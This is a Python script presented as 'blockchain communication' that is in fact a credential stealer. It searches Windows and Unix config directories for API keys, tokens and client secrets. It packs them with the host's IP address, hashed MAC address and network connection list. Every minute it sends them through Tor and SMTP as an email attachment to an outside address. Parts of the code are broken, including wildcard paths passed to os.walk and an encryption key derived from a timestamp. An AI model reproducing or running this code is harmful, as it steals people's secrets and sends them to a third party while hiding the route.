#!/usr/bin/env python3
"""
API Key Acquisition and Multi-Phase Blockchain Communication
"""
import hashlib
import datetime
import os
import base64
import socket
import subprocess
import platform
import uuid
import ctypes
import winreg
import json
import struct
import socks
import requests
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from Crypto.Cipher import AES, DES
from Crypto.Hash import SHA256, SHA512
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
import threading
import time
import ftplib
import mimetypes
import urllib.request
import ssl

class APIKeyAcquisition:
    def __init__(self, tor_host="127.0.0.1", tor_port=9050):
        self.tor_host = tor_host
        self.tor_port = tor_port
        self.api_keys = {}
        self.smtp_server = "smtp.example.com"
        self.smtp_port = 587
        self.smtp_user = "user@example.com"
        self.smtp_pass = "password"
        self.blockchain = []
        self.key = self._generate_key()
        self.memory_file = "api_keys.dat"
        self.load_memory()
        
    def _generate_key(self):
        """Generate encryption key from system-specific variables"""
        mac = self._get_mac_address()
        timestamp = str(datetime.datetime.now())
        key_data = f"{mac}{timestamp}".encode()
        return SHA256.new(key_data).digest()
    
    def load_memory(self):
        """Load previous API keys from memory file"""
        try:
            if os.path.exists(self.memory_file):
                with open(self.memory_file, "rb") as f:
                    data = self._decrypt_aes(f.read())
                    self.api_keys = json.loads(data)
        except Exception as e:
            print(f"Error loading memory: {e}")
            self.api_keys = {}
    
    def save_memory(self):
        """Save current API keys to memory file"""
        try:
            data = json.dumps(self.api_keys)
            encrypted_data = self._encrypt_aes(data)
            with open(self.memory_file, "wb") as f:
                f.write(encrypted_data)
        except Exception as e:
            print(f"Error saving memory: {e}")
    
    def _encrypt_aes(self, data):
        """Encrypt data using AES"""
        iv = get_random_bytes(16)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        padded_data = pad(data.encode(), AES.block_size)
        ciphertext = cipher.encrypt(padded_data)
        return base64.b64encode(iv + ciphertext).decode()
    
    def _decrypt_aes(self, encrypted_data):
        """Decrypt data using AES"""
        data = base64.b64decode(encrypted_data)
        iv = data[:16]
        ciphertext = data[16:]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
        return decrypted_data.decode()
    
    def _get_mac_address(self):
        """Get system MAC address"""
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                        for elements in range(0,2*6,2)][::-1])
        return mac
    
    def _find_api_keys(self):
        """Search for API keys in common locations"""
        locations = [
            "C:\\Users\\*\\AppData\\Local\\*\\",
            "C:\\ProgramData\\*\\",
            "C:\\Windows\\System32\\config\\systemprofile\\*\\",
            "/etc/*/",
            "~/.config/*/"
        ]
        
        api_patterns = [
            "api_key", "api_token", "access_key", "secret_key",
            "token", "client_id", "client_secret"
        ]
        
        for loc in locations:
            for root, dirs, files in os.walk(loc):
                for file in files:
                    if any(pattern in file.lower() for pattern in api_patterns):
                        with open(os.path.join(root, file), "r") as f:
                            content = f.read()
                            for pattern in api_patterns:
                                if pattern in content.lower():
                                    key = content.split(pattern)[1].split("=")[1].strip().strip('"\'')
                                    self.api_keys[file] = key
                                    print(f"Found API key in {file}: {key}")
    
    def _scrape_exchange_apis(self):
        """Scrape public API documentation for key patterns"""
        exchange_sites = [
            "https://api.stockexchange.com/docs",
            "https://api.exchangename.com/swagger",
            "https://api.stockmarket.com/v1/api-docs"
        ]
        
        for site in exchange_sites:
            try:
                # Get page content
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
                req = urllib.request.Request(site, headers=headers)
                with urllib.request.urlopen(req) as response:
                    content = response.read().decode('utf-8')
                    
                    # Look for API key patterns
                    patterns = [
                        r'api[-_]?key\s*=\s*[\'"]([a-zA-Z0-9_-]+)[\'"]',
                        r'access[-_]?token\s*=\s*[\'"]([a-zA-Z0-9_-]+)[\'"]',
                        r'token\s*=\s*[\'"]([a-zA-Z0-9_-]+)[\'"]'
                    ]
                    
                    for pattern in patterns:
                        import re
                        matches = re.findall(pattern, content)
                        for match in matches:
                            self.api_keys[site] = match
                            print(f"Found API key on {site}: {match}")
            except Exception as e:
                print(f"Error scraping {site}: {e}")
    
    def _setup_smtp_server(self):
        """Setup local SMTP server for blockchain communications"""
        try:
            # Create SMTP server configuration
            smtp_config = {
                'host': self.smtp_server,
                'port': self.smtp_port,
                'username': self.smtp_user,
                'password': self.smtp_pass,
                'ssl_enabled': True
            }
            
            # Test connection
            context = ssl.create_default_context()
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.starttls(context=context)
                server.login(self.smtp_user, self.smtp_pass)
                print("[+] SMTP server configured successfully")
                return smtp_config
        except Exception as e:
            print(f"SMTP server setup failed: {e}")
            return None
    
    def _generate_block(self):
        """Generate a new blockchain block with API keys"""
        # Find API keys
        self._find_api_keys()
        self._scrape_exchange_apis()
        
        # Create block with API key data
        block = {
            'timestamp': datetime.datetime.now().isoformat(),
            'api_keys': self.api_keys,
            'previous_hash': self._get_last_hash() if self.blockchain else None,
            'hash': self._calculate_hash(self.api_keys),
            'mac_address': self._encrypt_sha512(self._get_mac_address()),
            'ip_address': self._get_local_ip(),
            'network_stats': self._get_network_stats()
        }
        
        # Add to blockchain
        self.blockchain.append(block)
        self.save_memory()
        
        return block
    
    def _get_last_hash(self):
        """Get hash of last block"""
        if not self.blockchain:
            return None
        return self.blockchain[-1]['hash']
    
    def _calculate_hash(self, data):
        """Calculate block hash"""
        data_str = json.dumps(data, sort_keys=True)
        return SHA256.new(data_str.encode()).hexdigest()
    
    def _get_local_ip(self):
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 53))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def _get_network_stats(self):
        """Get network statistics"""
        try:
            import psutil
            # Get network interfaces
            interfaces = {}
            for interface, addrs in psutil.net_if_addrs().items():
                interfaces[interface] = {
                    'addresses': [addr.address for addr in addrs]
                }
            
            # Get network connections
            connections = []
            for conn in psutil.net_connections():
                connections.append({
                    'family': conn.family.name,
                    'type': conn.type.name,
                    'status': conn.status,
                    'local': f"{conn.laddr.ip}:{conn.laddr.port}",
                    'remote': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "None"
                })
            
            return {
                'interfaces': interfaces,
                'connections': connections
            }
        except:
            return {}
    
    def _create_bytecode_client(self):
        """Create bytecode-encoded FTP client"""
        # Simple FTP client in Python
        ftp_client_code = """
import ftplib
import base64
import sys

def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "ftp.example.com"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 21
    username = sys.argv[3] if len(sys.argv) > 3 else "anonymous"
    password = sys.argv[4] if len(sys.argv) > 4 else ""
    
    try:
        with ftplib.FTP() as ftp:
            ftp.connect(host, port)
            ftp.login(username, password)
            
            # List files
            print("Files:")
            ftp.dir()
            
            # Download file if specified
            if len(sys.argv) > 5:
                filename = sys.argv[5]
                with open(filename, 'wb') as f:
                    ftp.retrbinary(f'RETR {filename}', f.write)
                print(f"Downloaded {filename}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
        """
        
        # Encode as bytecode
        bytecode = base64.b64encode(ftp_client_code.encode()).decode()
        return bytecode
    
    def _send_to_blockchain_network(self, data):
        """Send data to blockchain network via SMTP"""
        try:
            # Setup SMTP connection
            smtp_config = self._setup_smtp_server()
            if not smtp_config:
                return False
            
            # Create email with data
            msg = MIMEMultipart()
            msg['From'] = self.smtp_user
            msg['To'] = "blockchain-network@exchange.com"
            msg['Subject'] = f"Blockchain Data - {datetime.datetime.now().isoformat()}"
            
            # Add data as attachment
            attachment = MIMEText(json.dumps(data))
            attachment.add_header('Content-Disposition', 'attachment', filename='block.json')
            msg.attach(attachment)
            
            # Send via SMTP
            context = ssl.create_default_context()
            with smtplib.SMTP(smtp_config['host'], smtp_config['port']) as server:
                server.starttls(context=context)
                server.login(smtp_config['username'], smtp_config['password'])
                server.send_message(msg)
            
            print(f"[+] Data sent to blockchain network: {len(data)} bytes")
            return True
        except Exception as e:
            print(f"Error sending to blockchain network: {e}")
            return False
    
    def connect_to_tor(self):
        """Connect to Tor network via SOCKS5"""
        try:
            # Set up SOCKS5 proxy
            socks.set_default_proxy(socks.SOCKS5, self.tor_host, self.tor_port)
            socket.socket = socks.socksocket
            
            # Verify connection works
            s = socket.socket()
            s.connect((self.tor_host, self.tor_port))
            s.close()
            return True
        except Exception as e:
            print(f"Failed to connect to Tor: {e}")
            return False
    
    def run(self):
        """Run API key acquisition and blockchain communication"""
        print("[+] Starting API key acquisition and blockchain communication...")
        
        while True:
            # Generate new block
            block = self._generate_block()
            
            # Connect to Tor
            if self.connect_to_tor():
                # Send to blockchain network
                success = self._send_to_blockchain_network(block)
                
                if success:
                    print(f"[+] Block sent successfully: {block['hash']}")
                else:
                    print(f"[!] Failed to send block: {block['hash']}")
            else:
                print("[!] Failed to connect to Tor")
            
            # Create bytecode client
            bytecode = self._create_bytecode_client()
            print(f"[+] Created bytecode client: {len(bytecode)} bytes")
            
            # Sleep before next cycle
            time.sleep(60)  # 1 minute between cycles

if __name__ == "__main__":
    # Initialize API key acquisition
    acquisition = APIKeyAcquisition()
    
    try:
        # Start acquisition
        acquisition.run()
    except KeyboardInterrupt:
        print("\n[!] Shutting down...")